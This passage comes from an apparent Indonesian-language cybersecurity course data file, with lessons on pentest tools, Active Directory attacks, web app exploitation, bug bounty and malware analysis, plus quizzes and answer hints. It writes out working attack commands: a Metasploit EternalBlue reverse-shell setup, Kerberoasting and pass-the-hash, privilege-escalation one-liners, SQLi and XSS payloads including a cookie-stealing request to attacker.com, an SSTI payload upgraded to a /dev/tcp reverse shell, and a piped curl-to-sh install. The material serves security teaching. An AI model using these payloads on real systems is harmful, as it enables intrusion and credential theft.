  <li><code>LinPEAS/WinPEAS</code> — Automated privilege escalation scanner untuk Linux/Windows.</li>
  <li><code>BloodHound</code> — Visualisasi attack path di Active Directory.</li>
  <li><code>Mimikatz</code> — Dump credentials dari Windows memory.</li>
</ul>
<div class="cv-tip-box">💡 <span>Semua tools ini tersedia di Kali Linux. Jangan beli Kali — download gratis dari kali.org dan install di VirtualBox.</span></div>
`,
        commands: `# ─── ARSENAL TOOLS ESENSIAL ──────────────────────────────────

# === BURP SUITE WORKFLOW ===
# 1. Set proxy browser: 127.0.0.1:8080
# 2. Install Burp CA certificate di browser
# 3. Proxy > Intercept ON > Browse target
# 4. Klik kanan request > Send to Repeater (Ctrl+R)
# 5. Modifikasi dan kirim ulang

# === METASPLOIT WORKFLOW ===
msfconsole
msf6 > search eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit > info
msf6 exploit > set RHOSTS 192.168.1.10
msf6 exploit > set LHOST 192.168.1.50
msf6 exploit > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit > check   # verifikasi target rentan
msf6 exploit > run

# Meterpreter commands setelah exploit berhasil:
meterpreter > sysinfo         # info sistem
meterpreter > getuid          # siapa kita sekarang?
meterpreter > hashdump        # dump password hash Windows
meterpreter > shell           # interactive shell
meterpreter > upload local.exe C:\\Windows\\Temp\\
meterpreter > download C:\\flag.txt ./

# === HASHCAT ===
hashcat -m 0 -a 0 hashes.txt rockyou.txt          # MD5 + dictionary
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt         # NTLM Windows
hashcat -m 1800 -a 0 sha512.txt rockyou.txt       # SHA-512 Linux
hashcat -m 2500 -a 0 wifi.hccapx rockyou.txt      # WPA2 WiFi
hashcat --show -m 0 hashes.txt                     # lihat yang sudah crack

# === LINPEAS (Privilege Escalation) ===
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`,
        simulation: [
          { input: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe', output: `[-] No platform was selected, choosing Msf::Module::Platform::Windows from payload
[-] No arch selected, selecting arch: x64 from payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
[+] shell.exe saved.
[*] Setup listener: use multi/handler → set PAYLOAD → run`, type: 'info' },
          { input: 'hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt', output: `hashcat (v6.2.6) starting...
OpenCL Platform: NVIDIA GeForce RTX 3080
Speed: 15,234.2 MH/s
Progress: 14,344,391/14,344,391 (100.00%)

5f4dcc3b5aa765d61d8327deb882cf99:password
482c811da5d5b4bc6d497ffa98491e38:hello123
[+] 2/5 hashes cracked in 0.94 seconds
Session..........: hashcat  Status: Cracked`, type: 'info' },
        ],
        typingTarget: 'hashcat -m 0 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt --force',
        quiz: {
          q: 'Tools mana yang paling tepat untuk mendeteksi SQL Injection secara otomatis?',
          options: ['Nmap', 'Burp Suite Intruder', 'SQLMap', 'Hydra'],
          correct: 2,
          explanation: 'SQLMap adalah tools khusus untuk SQL injection — bisa detect dan exploit SQLi secara otomatis di berbagai database (MySQL, MSSQL, PostgreSQL, Oracle). Burp Suite bisa juga tapi manual. Nmap untuk port scan, Hydra untuk brute force.',
        },
        challenge: {
          title: 'Pilih Tools yang Tepat untuk Setiap Skenario',
          desc: 'Pasangkan setiap skenario dengan tools yang paling tepat digunakan.',
          starter: `# Skenario Pentesting:
# A) Perlu intercept dan modifikasi HTTP request saat testing web app
# B) Menemukan hash NTLM dari Windows, perlu di-crack
# C) Ingin tahu subdomain apa saja yang dimiliki target.com
# D) Sudah dapat shell di Linux, perlu cari cara naik privilege
# E) Perlu exploit CVE yang sudah ada module-nya
# F) Ingin scan semua port dan deteksi versi service
# G) Perlu brute force login SSH dengan wordlist

# Tools yang tersedia:
# 1. Nmap
# 2. Metasploit
# 3. Burp Suite
# 4. Hashcat (-m 1000)
# 5. Hydra
# 6. LinPEAS
# 7. Subfinder

# Jawaban (format: A=3, B=4, dst):
# A = ___
# B = ___
# C = ___
# D = ___
# E = ___
# F = ___
# G = ___`,
          hint: 'A=Burp Suite, B=Hashcat, C=Subfinder, D=LinPEAS, E=Metasploit, F=Nmap, G=Hydra',
          answerCheck: ['burp', 'hashcat', 'subfinder', 'linpeas', 'metasploit', 'nmap', 'hydra'],
        },
        xp: 105,
      },
    ]
  },

  // ════════════════════════════════════════════════════════════
  // TAHAP 3: SPESIALISASI (3 topik)
  // ════════════════════════════════════════════════════════════
  {
    id: 3, name: 'Spesialisasi', icon: '⚔️', color: '#a78bfa',
    topics: [
      {
        id: 's1', title: 'Red Team & Offensive', diff: 'advanced',
        explain: `
<h3>Red Team — Berpikir dan Bertindak seperti Attacker</h3>
<p>Red Team adalah tim yang secara sah menyimulasikan serangan Advanced Persistent Threat (APT) pada organisasi. Berbeda dengan pentest biasa, Red Team operation bisa berlangsung berminggu-minggu dan bertujuan menguji seluruh kemampuan deteksi dan respons organisasi.</p>
<h4>🔷 Active Directory Attacks</h4>
<ul>
  <li><strong>Kerberoasting</strong> — Request TGS ticket untuk service account, crack offline. Tidak perlu privilege tinggi!</li>
  <li><strong>Pass-the-Hash</strong> — Gunakan NTLM hash langsung tanpa tahu password plaintext.</li>
  <li><strong>DCSync</strong> — Simulasi domain controller untuk dump semua password hash.</li>
  <li><strong>BloodHound</strong> — Visualisasi path dari user biasa ke Domain Admin.</li>
</ul>
<h4>🔷 Living off the Land (LotL)</h4>
<p>Gunakan tools yang sudah ada di sistem Windows (LOLBins) untuk menghindari deteksi antivirus:</p>
<ul>
  <li><code>certutil</code> — Download file dari internet</li>
  <li><code>mshta</code> — Execute HTA files</li>
  <li><code>rundll32</code> — Run DLL</li>
  <li><code>powershell -encodedcommand</code> — Execute encoded PS command</li>
</ul>
<h4>🔷 C2 (Command & Control) Framework</h4>
<ul>
  <li><strong>Cobalt Strike</strong> — Gold standard commercial C2 (mahal, sering disalahgunakan)</li>
  <li><strong>Sliver</strong> — Open source, modern, dikembangkan oleh BishopFox</li>
  <li><strong>Havoc</strong> — Open source C2 framework yang powerful</li>
</ul>
<div class="cv-danger-box">🚫 <span>Red Team operation HANYA boleh dilakukan dengan kontrak tertulis yang jelas. Menggunakan teknik ini tanpa otorisasi adalah kejahatan. Gunakan hanya di lab sendiri atau target yang sudah diizinkan.</span></div>
`,
        commands: `# ─── RED TEAM TECHNIQUES ─────────────────────────────────────

# === ACTIVE DIRECTORY ENUMERATION ===
# BloodHound data collection
SharpHound.exe -c All --zipfilename ad_data.zip

# PowerView (PowerShell AD recon)
Import-Module PowerView.ps1
Get-Domain
Get-DomainUser | Select samaccountname, description, memberof
Get-DomainGroup -Identity "Domain Admins" | Select member
Get-DomainComputer | Select name, operatingsystem
Find-LocalAdminAccess    # di mana kita admin?

# Kerberoasting
Invoke-Kerberoast -OutputFormat hashcat | Select Hash
# Lalu crack dengan hashcat:
hashcat -m 13100 -a 0 kerb_hashes.txt rockyou.txt

# Pass-the-Hash
evil-winrm -i 192.168.1.10 -u administrator -H "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"

# === PRIVILEGE ESCALATION LINUX ===
# Cek sudo misconfig
sudo -l
# Output: (ALL) NOPASSWD: /usr/bin/find
# Exploit: sudo find . -exec /bin/bash \\; -quit

# SUID exploitation
ls -la /usr/bin/python3     # jika SUID set:
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Cron job exploitation
cat /etc/crontab
# Jika ada script yang world-writable:
echo 'chmod u+s /bin/bash' >> /vulnerable/script.sh

# === WINDOWS PRIVILEGE ESCALATION ===
# AlwaysInstallElevated (registry misconfiguration)
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
# Jika 1: buat MSI payload dan install

# Token impersonation
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "DOMAIN\\Admin"`,
        simulation: [
          { input: 'Invoke-Kerberoast -OutputFormat hashcat', output: `[*] Enumerating service accounts...
[+] SPN found: MSSQLSvc/sqlserver.corp.local:1433 (svc_sql)
[+] SPN found: HTTP/webserver.corp.local (svc_web)
[*] Requesting TGS tickets...
[+] Hash for svc_sql:
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sqlserver.corp.local:1433*$a4b3c...
[*] Save hash dan crack dengan: hashcat -m 13100 hash.txt rockyou.txt`, type: 'warn' },
          { input: 'sudo -l', output: `Matching Defaults entries for www-data on server:
    env_reset, mail_badpass, secure_path=...

User www-data may run the following commands on server:
    (ALL) NOPASSWD: /usr/bin/find
    
[!] PRIVESC VECTOR DITEMUKAN!
[!] Exploit: sudo find . -exec /bin/bash \\; -quit
[!] GTFOBins reference: https://gtfobins.github.io/gtfobins/find/`, type: 'err' },
        ],
        typingTarget: 'bloodhound-python -u john -p Password123 -d corp.local -dc dc01.corp.local -c All',
        quiz: {
          q: 'Apa itu Kerberoasting dalam konteks Active Directory attacks?',
          options: [
            'Serangan DDoS pada domain controller',
            'Meminta TGS ticket untuk service account lalu crack hash-nya secara offline',
            'Mencuri password dengan keylogger',
            'Membuat domain controller palsu'
          ],
          correct: 1,
          explanation: 'Kerberoasting memanfaatkan fakta bahwa setiap domain user bisa request TGS ticket untuk service account. Ticket ini dienkripsi dengan hash password service account — bisa di-crack offline tanpa alert di server!',
        },
        challenge: {
          title: 'Buat Attack Chain ke Domain Admin',
          desc: 'Berdasarkan info berikut, rancang attack chain dari user biasa ke Domain Admin.',
          starter: `# Informasi yang tersedia:
# - Kita punya akses sebagai: jdoe (domain user biasa)
# - BloodHound menunjukkan:
#   jdoe → memberOf → IT-Support (group)
#   IT-Support → GenericWrite → svc_backup (service account)  
#   svc_backup → memberOf → Domain Admins
#   
# - svc_backup memiliki SPN (bisa di-Kerberoast)
# - Kita punya password jdoe: Password123

# Rancang attack chain step by step:
# Step 1: _______________
# Step 2: _______________
# Step 3: _______________
# Step 4: _______________
# Step 5: Verifikasi Domain Admin: _______________

# Commands yang digunakan:
# Step 1 cmd: _______________
# Step 2 cmd: _______________
# Step 3 cmd: _______________`,
          hint: 'Step 1: Kerberoast svc_backup. Step 2: Crack hash-nya. Step 3: Login sebagai svc_backup. Step 4: Karena member Domain Admins, langsung domain admin. Atau: GenericWrite → set SPN → Kerberoast.',
          answerCheck: ['kerberoast', 'hashcat', 'domain admin', 'genericwrite'],
        },
        xp: 140,
      },
      {
        id: 's2', title: 'Web Application Security', diff: 'advanced',
        explain: `
<h3>Web Application Penetration Testing — Mendalam</h3>
<p>Web app pentesting adalah spesialisasi tersendiri yang sangat diminati. Hampir semua bug bounty ada di web. Memahami cara kerja web secara mendalam adalah kuncinya.</p>
<h4>🔷 SQL Injection — Dari Basic ke Advanced</h4>
<ul>
  <li><strong>Classic SQLi</strong> — Error-based, langsung lihat output SQL error</li>
  <li><strong>Blind SQLi</strong> — Tidak ada error, pakai true/false condition</li>
  <li><strong>Time-based Blind</strong> — Pakai SLEEP() untuk inferensikan data</li>
  <li><strong>Out-of-band</strong> — Exfiltrasi data via DNS/HTTP request</li>
</ul>
<h4>🔷 XSS — Cross-Site Scripting</h4>
<ul>
  <li><strong>Reflected XSS</strong> — Payload di URL, menyerang satu user (phishing)</li>
  <li><strong>Stored XSS</strong> — Payload tersimpan di database, menyerang semua yang buka halaman</li>
  <li><strong>DOM-based XSS</strong> — Payload dieksekusi oleh JavaScript di client-side</li>
</ul>
<h4>🔷 Server-Side Template Injection (SSTI)</h4>
<p>Input user dirender langsung sebagai template. Bisa RCE! Test: <code>{{7*7}}</code> → jika output 49, ada SSTI.</p>
<h4>🔷 JWT Attacks</h4>
<ul>
  <li>Ganti algorithm ke "none" → bypass signature</li>
  <li>Brute force weak secret key</li>
  <li>Algorithm confusion (RS256 → HS256)</li>
</ul>
<div class="cv-tip-box">💡 <span>Practice di: PortSwigger Web Security Academy (gratis!), OWASP Juice Shop, dan DVWA. Ini adalah lab terbaik untuk web security.</span></div>
`,
        commands: `# ─── WEB APPLICATION PENTESTING ─────────────────────────────

# === RECON WEB ===
subfinder -d target.com | httpx -o live.txt
cat live.txt | httpx -tech-detect -status-code -title
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403
paramspider --domain target.com    # temukan parameter tersembunyi
arjun -u https://target.com/api    # brute force parameter

# === SQL INJECTION MANUAL ===
# Test di field input / URL parameter:
'                    # Single quote — lihat ada error?
' OR '1'='1         # Bypass login
' UNION SELECT null,null,null-- -  # Column count
' UNION SELECT table_name,null FROM information_schema.tables-- -
' AND SLEEP(5)-- -  # Time-based blind test

# Dengan SQLMap:
sqlmap -u "https://target.com/item?id=1" --dbs --batch
sqlmap -u "https://target.com/" --data "user=a&pass=b" --level=5

# === XSS PAYLOADS ===
<script>alert(1)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(1)>
javascript:alert(1)
# Steal cookie:
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
# XSS to CSRF:
<script>fetch('/admin/deleteUser',{method:'POST',body:'id=1'})</script>

# === SSTI DETECTION ===
{{7*7}}               # Jinja2/Twig → 49
\${7*7}                # FreeMarker/Velocity → 49
<%= 7*7 %>            # ERB (Ruby) → 49
#{7*7}                # Pebble → 49
# Jika 49 muncul: SSTI confirmed!
# RCE di Jinja2:
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# === JWT MANIPULATION ===
# Decode (base64):
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
# Brute force secret:
hashcat -m 16500 -a 0 jwt.txt wordlist.txt
# jwt_tool untuk semua teknik:
python3 jwt_tool.py TOKEN -T  # tamper mode`,
        simulation: [
          { input: "sqlmap -u 'http://vuln.com/item?id=1' --dbs --batch", output: `[*] Detecting SQL injection...
[+] Parameter 'id': VULNERABLE (error-based, MySQL)
[*] Fetching databases...
[+] Databases:
    [*] information_schema
    [*] ecommerce_prod
    [*] admin_panel
[*] Fetching tables from 'ecommerce_prod'...
[+] Tables: users, orders, products, credit_cards
[!] 'credit_cards' table found — HIGH RISK`, type: 'err' },
          { input: "python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9... -C -d rockyou.txt", output: `[*] JWT Algorithm: HS256
[*] Brute forcing secret key...
[+] SECRET FOUND: secret123
[+] Forged admin token:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxx
[!] Use this token to impersonate admin!`, type: 'err' },
          { input: "Input: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}", output: `Template rendered output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[!] SSTI CONFIRMED → RCE sebagai www-data!
[!] Next: upgrade ke reverse shell
[!] Payload: {{config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/192.168.1.50/4444 0>&1').read()}}`, type: 'err' },
        ],
        typingTarget: 'sqlmap -u "http://target.com/login" --data "username=admin&password=test" --dbms=mysql --dump --batch',
        quiz: {
          q: 'Perbedaan utama antara Stored XSS dan Reflected XSS adalah?',
          options: [
            'Stored XSS lebih mudah di-exploit',
            'Stored XSS tersimpan di database dan menyerang semua pengunjung; Reflected XSS hanya menyerang target yang mengklik link khusus',
            'Reflected XSS lebih berbahaya dari Stored XSS',
            'Keduanya sama saja, hanya berbeda nama'
          ],
          correct: 1,
          explanation: 'Stored XSS jauh lebih berbahaya — payload tersimpan di server dan dieksekusi setiap kali halaman dibuka oleh siapapun. Reflected XSS butuh korban mengklik link yang sudah dimanipulasi.',
        },
        challenge: {
          title: 'Exploit SQL Injection Step by Step',
          desc: 'Ikuti alur eksploitasi SQL Injection berikut dan lengkapi setiap langkah.',
          starter: `# Target: http://shop.vuln.com/product?id=1
# Database: MySQL

# Step 1: Konfirmasi SQLi
# Ketik payload yang menunjukkan error atau perubahan:
Payload Step 1: _______________

# Step 2: Cari jumlah kolom dengan ORDER BY
# Coba: id=1 ORDER BY 1-- - , lalu 2, 3, dst sampai error
Payload Step 2 (4 kolom): _______________

# Step 3: Cari kolom yang ditampilkan di halaman
# Gunakan UNION SELECT dengan null:
Payload Step 3: _______________

# Step 4: Ambil nama database
Payload Step 4: _______________

# Step 5: Ambil nama tabel
Payload Step 5: _______________

# Step 6: Dump username dan password dari tabel users
Payload Step 6: _______________

# Bonus: Cara baca file di server via SQLi:
Payload Bonus: _______________`,
          hint: "Step 1: 1', Step 2: 1 ORDER BY 4-- -, Step 3: 1 UNION SELECT null,null,null,null-- -, Step 4: UNION SELECT database(),null,null,null-- -, Step 5: UNION SELECT table_name dari information_schema.tables, Step 6: UNION SELECT username,password FROM users-- -",
          answerCheck: ['union', 'order by', 'information_schema', 'database()', 'username'],
        },
        xp: 130,
      },
      {
        id: 's3', title: 'Bug Bounty Hunting', diff: 'advanced',
        explain: `
<h3>Bug Bounty — Dibayar untuk Menemukan Celah Keamanan</h3>
<p>Bug bounty adalah program di mana perusahaan membayar peneliti keamanan yang menemukan dan melaporkan celah keamanan secara bertanggung jawab. Ini adalah cara terbaik untuk mendapat penghasilan sambil mengembangkan skill.</p>
<h4>🔷 Platform Bug Bounty</h4>
<ul>
  <li><strong>HackerOne</strong> — Terbesar, banyak program besar (Google, Apple, Microsoft)</li>
  <li><strong>Bugcrowd</strong> — Platform populer kedua</li>
  <li><strong>Intigriti</strong> — Fokus Eropa, pembayaran bagus</li>
  <li><strong>Immunefi</strong> — Web3/blockchain, bounty bisa jutaan dollar!</li>
</ul>
<h4>🔷 Metodologi Bug Bounty yang Efektif</h4>
<ol>
  <li><strong>Pilih target dengan cerdas</strong> — Program baru = kompetisi rendah, banyak bug masih tersisa</li>
  <li><strong>Recon dalam</strong> — Subdomain, endpoint, parameter tersembunyi. Ini bedanya hunter sukses dan tidak.</li>
  <li><strong>Fokus pada high-impact bugs</strong> — IDOR, SSRF, RCE, Auth Bypass bayarannya paling besar</li>
  <li><strong>Baca program scope dengan teliti</strong> — Jangan test di luar scope atau kena banned</li>
  <li><strong>Tulis laporan yang jelas</strong> — Impact + steps to reproduce + PoC = review lebih cepat</li>
</ol>
<h4>🔷 Bayaran Bug Bounty (Estimasi)</h4>
<ul>
  <li>🔴 <strong>Critical (RCE, SQLi, Auth Bypass)</strong> — $5,000 - $100,000+</li>
  <li>🟠 <strong>High (IDOR, SSRF, XXE)</strong> — $1,000 - $10,000</li>
  <li>🟡 <strong>Medium (XSS, CSRF)</strong> — $500 - $2,000</li>
  <li>🟢 <strong>Low (Info Disclosure)</strong> — $100 - $500</li>
</ul>
<div class="cv-tip-box">💡 <span>Hunter sukses pertama kali rata-rata butuh 3-6 bulan belajar + practice di TryHackMe/HackTheBox. Jangan langsung ke program bayaran — mulai dari VDP (Vulnerability Disclosure Program) yang tidak berbayar untuk belajar report.</span></div>
`,
        commands: `# ─── BUG BOUNTY RECON TOOLKIT ────────────────────────────────

# === SUBDOMAIN ENUMERATION ===
subfinder -d target.com -o subs.txt
amass enum -d target.com -o amass.txt
cat subs.txt amass.txt | sort -u > all_subs.txt
cat all_subs.txt | httpx -o live_hosts.txt -status-code -title

# === CONTENT DISCOVERY ===
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403
katana -u https://target.com -d 5 -o urls.txt    # crawl semua URL
waybackurls target.com | grep "\\.php\\|\\.asp\\|\\.env" | sort -u

# === PARAMETER DISCOVERY ===
paramspider --domain target.com --output params.txt
arjun -u https://target.com/api/user -m POST
# Cek parameter lama dari wayback machine:
gau target.com | grep "?" | uro | sort -u > params_historical.txt

# === AUTOMATED SCANNING ===
# Nuclei - template-based scanner
nuclei -u https://target.com -t cves/ -t exposures/ -o nuclei_results.txt
nuclei -l live_hosts.txt -t vulnerabilities/ -severity critical,high

# === REPORT TEMPLATE ===
# Title: [IDOR] Accessing Other Users' Private Data via /api/user/{id}
#
# Severity: High (CVSS 8.1)
#
# Summary:
# An IDOR vulnerability in /api/v1/users/{id}/profile allows any
# authenticated user to access private profile data of other users
# by modifying the id parameter.
#
# Steps to Reproduce:
# 1. Login as User A (id: 1234)
# 2. Intercept GET /api/v1/users/1234/profile
# 3. Change 1234 to 1235 (User B's id)
# 4. Response contains User B's private data
#
# Impact:
# Mass PII exposure of all registered users (estimated 2M users)
#
# Remediation:
# Validate that the authenticated user owns the requested resource`,
        simulation: [
          { input: 'subfinder -d bugbounty-target.com | httpx -status-code -title', output: `[200] https://api.bugbounty-target.com [API Gateway]
[200] https://admin.bugbounty-target.com [Admin Panel - Login]
[200] https://dev.bugbounty-target.com [Dev Environment]  ← MENARIK!
[301] https://beta.bugbounty-target.com → /beta/
[200] https://s3.bugbounty-target.com [S3 Bucket Listing!]  ← KRITIS!
[403] https://internal.bugbounty-target.com
Total: 47 subdomains live`, type: 'info' },
          { input: 'nuclei -u https://dev.bugbounty-target.com -t cves/ -severity critical', output: `[CVE-2021-44228] [critical] https://dev.bugbounty-target.com [Log4Shell]
[CVE-2022-22963] [critical] https://dev.bugbounty-target.com [Spring4Shell]
[exposed-panels:admin-panel] https://dev.bugbounty-target.com/admin
[!] 2 CRITICAL CVEs found on dev environment!
[!] Report immediately — potential $10,000+ bounty`, type: 'err' },
        ],
        typingTarget: 'subfinder -d target.com | httpx -o live.txt && nuclei -l live.txt -t cves/ -t exposures/ -severity critical,high',
        quiz: {
          q: 'Jenis bug apa yang biasanya mendapat bayaran terbesar di program bug bounty?',
          options: [
            'Self-XSS (XSS yang hanya bisa dieksploitasi oleh diri sendiri)',
            'Missing security headers',
            'Remote Code Execution (RCE)',
            'Clickjacking'
          ],
          correct: 2,
          explanation: 'RCE (Remote Code Execution) memungkinkan attacker menjalankan kode sembarangan di server — ini adalah bug paling kritis. Bayaran bisa mencapai $100,000+ di program besar. Self-XSS dan missing headers biasanya tidak mendapat bounty.',
        },
        challenge: {
          title: 'Buat Laporan Bug Bounty yang Profesional',
          desc: 'Kamu menemukan IDOR di endpoint berikut. Tulis laporan bug bounty yang lengkap dan profesional.',
          starter: `# Temuan:
# - Target: https://app.example.com
# - Endpoint: GET /api/v2/documents/{doc_id}
# - Kamu login sebagai user dengan email: test@test.com (user_id: 9999)
# - Kamu request dokumen milikmu: /api/v2/documents/DOC-9999-001
# - Kamu coba: /api/v2/documents/DOC-1234-001 (milik user lain)
# - Response: 200 OK dengan isi dokumen orang lain (invoice senilai $50,000)
# - Kamu estimate ada ~500,000 dokumen berdasarkan ID pattern

# Tulis laporan lengkap:

## Title:
[TYPE] [IMPACT] via [ENDPOINT]

## Severity: 

## CVSS Score:

## Summary:

## Steps to Reproduce:
1. 
2. 
3. 

## Proof of Concept (Request/Response):

## Impact:

## Affected Users:

## Remediation:`,
          hint: 'Title format: [IDOR] Access to Any User Document via /api/v2/documents/{id}. Severity: High. Impact: 500k dokumen sensitif terekspos. Remediation: cek ownership dokumen sebelum return.',
          answerCheck: ['idor', 'high', 'steps to reproduce', 'remediation', 'impact'],
        },
        xp: 135,
      },
    ]
  },

  // ════════════════════════════════════════════════════════════
  // TAHAP 4: PROFESIONAL (3 topik)
  // ════════════════════════════════════════════════════════════
  {
    id: 4, name: 'Level Profesional', icon: '🏆', color: '#f7b96a',
    topics: [
      {
        id: 'p1', title: 'Malware Analysis', diff: 'expert',
        explain: `
<h3>Malware Analysis — Membedah Kode Berbahaya</h3>
<p>Malware analyst adalah profesi yang sangat langka dan bergaji tinggi. Tugasnya: menganalisis malware untuk memahami cara kerjanya, mengekstrak IOC (Indicator of Compromise), dan membangun deteksi.</p>
<h4>🔷 Jenis Analisis</h4>
<ul>
  <li><strong>Static Analysis</strong> — Analisis tanpa menjalankan malware. Baca kode, ekstrak strings, identifikasi fungsi.</li>
  <li><strong>Dynamic Analysis</strong> — Jalankan malware di sandbox yang terisolasi dan pantau perilakunya.</li>
  <li><strong>Hybrid</strong> — Kombinasi keduanya untuk pemahaman lebih dalam.</li>
</ul>
<h4>🔷 Tools Wajib Malware Analyst</h4>
<ul>
  <li><code>Ghidra</code> — Reverse engineering framework dari NSA (GRATIS!)</li>
  <li><code>IDA Pro</code> — Gold standard disassembler (mahal, ada versi free)</li>
  <li><code>x64dbg</code> — Dynamic debugger untuk Windows</li>
  <li><code>FLARE VM</code> — Windows-based malware analysis environment</li>
  <li><code>REMnux</code> — Linux distro untuk malware analysis</li>
  <li><code>Cuckoo Sandbox</code> — Automated malware analysis</li>
  <li><code>Any.run</code> — Online interactive sandbox</li>
</ul>
<h4>🔷 Teknik Packing dan Obfuscation</h4>
<p>Malware sering di-pack atau di-obfuscate untuk menghindari deteksi antivirus:</p>
<ul>
  <li><strong>UPX packing</strong> — Kompresi executable, perlu di-unpack dulu</li>
  <li><strong>Custom packer</strong> — Lebih sulit, butuh unpack manual</li>
  <li><strong>String encryption</strong> — Strings dienkripsi, di-decrypt saat runtime</li>
  <li><strong>Anti-debugging</strong> — Deteksi jika sedang di-debug, ubah behavior</li>
</ul>
<div class="cv-danger-box">🚫 <span>SELALU analisis malware di VM yang terisolasi dari network! Ambil snapshot sebelum mulai. Jangan pernah buka malware di komputer utama.</span></div>
`,
        commands: `# ─── MALWARE ANALYSIS WORKFLOW ───────────────────────────────

# === STATIC ANALYSIS ===
# Identifikasi file
file malware.exe
xxd malware.exe | head -4      # magic bytes
strings malware.exe | head -100
strings -n 8 malware.exe | grep -E "(http|ftp|cmd|reg|HKEY)"

# Hash lookup di VirusTotal
md5sum malware.exe
sha256sum malware.exe
# Submit ke: virustotal.com atau via API:
curl --request POST 'https://www.virustotal.com/api/v3/files' \\
  --header 'x-apikey: YOUR_API_KEY' \\
  --form file=@malware.exe

# PE Analysis (Windows executable)
pecheck malware.exe              # header info
pefile malware.exe               # import table, sections
# Imports yang mencurigakan:
# CreateRemoteThread → code injection
# VirtualAllocEx → memory allocation di proses lain
# WriteProcessMemory → tulis ke proses lain
# RegSetValueEx → modifikasi registry
# WinExec/ShellExecute → eksekusi program

# Cek packer
peid malware.exe                 # deteksi UPX, MPRESS, dll
upx -d packed.exe                # unpack UPX

# YARA scanning
yara -r /opt/yara-rules/ malware.exe

# === DYNAMIC ANALYSIS ===
# Di VM terisolasi:
# 1. Buka Process Monitor (Sysinternals) - filter by process
# 2. Buka Wireshark - capture all traffic
# 3. Buka Regshot - snapshot registry before
# 4. Jalankan malware
# 5. Regshot compare after
# 6. Lihat process monitor untuk file/registry changes
# 7. Lihat wireshark untuk network traffic

# Automated sandbox:
# Upload ke: app.any.run atau hybrid-analysis.com`,
        simulation: [
          { input: 'strings malware.exe | grep -E "(http|cmd|reg)"', output: `[*] Interesting strings found:
http://185.220.101.12:8080/beacon
http://185.220.101.12:8080/task
cmd.exe /c net user hacker Admin123! /add
cmd.exe /c net localgroup administrators hacker /add
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon
[!] IOCs extracted:
  C2 Server: 185.220.101.12:8080
  New admin user: hacker / Admin123!
  Persistence: Registry Run Key`, type: 'err' },
          { input: 'cuckoo submit malware.exe', output: `[*] Submitting sample to Cuckoo Sandbox...
[*] Analysis running (60 seconds)...
[+] Analysis complete!

BEHAVIORAL REPORT:
Network: HTTP POST to 185.220.101.12:8080/beacon (every 60s)
Files Created: C:\\Windows\\System32\\svchost32.exe
Files Created: C:\\Users\\All Users\\.hidden\\persist.exe  
Registry: HKCU\\Run\\WindowsUpdate = svchost32.exe
Processes: Created cmd.exe with suspicious args
Classification: TROJAN.Beacon.Generic
Verdict: MALICIOUS (Score: 9.8/10)`, type: 'err' },
        ],
        typingTarget: 'strings -n 8 malware.exe | grep -E "(http|https|ftp|cmd|powershell|HKEY|registry)" | sort -u',
        quiz: {
          q: 'Apa perbedaan utama antara static dan dynamic malware analysis?',
          options: [
            'Static lebih berbahaya dari dynamic',
            'Static: analisis kode tanpa menjalankan; Dynamic: jalankan di sandbox dan pantau perilaku',
            'Dynamic tidak bisa detect malware yang ter-pack',
            'Static hanya untuk Linux, dynamic untuk Windows'
          ],
          correct: 1,
          explanation: 'Static analysis aman (tidak run malware) tapi bisa terhalang oleh obfuscation/packing. Dynamic analysis melihat perilaku nyata malware saat dijalankan di sandbox terisolasi — lebih efektif untuk malware yang ter-pack tapi lebih berisiko.',
        },
        challenge: {
          title: 'Buat YARA Rule dari IOC',
          desc: 'Berdasarkan strings yang ditemukan di malware, buat YARA rule yang bisa mendeteksi malware ini dan variannya.',
          starter: `# Strings yang ditemukan di malware sample:
# 1. http://185.220.101.12:8080/beacon
# 2. cmd.exe /c net user hacker
# 3. HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
# 4. Your files have been encrypted
# 5. .locked (extension yang ditambahkan ke file)
# 6. Send 0.5 BTC to 1A2B3C4D...

# Buat YARA rule:
rule Malware_Sample {
    meta:
        description = "_______________"
        author = "_______________"
        date = "2024-12-15"
        
    strings:
        $c2 = "_______________"
        $cmd = "_______________" nocase
        $reg = "_______________" wide
        $ransom1 = "_______________"
        $ext = "_______________"
        
    condition:
        _______________
}

# Jelaskan kondisi yang paling efektif:
# - Apakah pakai "any of them" atau "all of them" atau campuran?
# - Mengapa?`,
          hint: 'Gunakan "any of ($c2, $cmd)" untuk false positive rendah tapi juga bisa temukan varian. "wide" untuk string Unicode (Windows). Kondisi ideal: ($c2) and any of ($ransom*)',
          answerCheck: ['rule', 'strings', 'condition', 'meta', 'nocase'],
        },
        xp: 150,
      },
      {
        id: 'p2', title: 'Cloud Security', diff: 'expert',
        explain: `
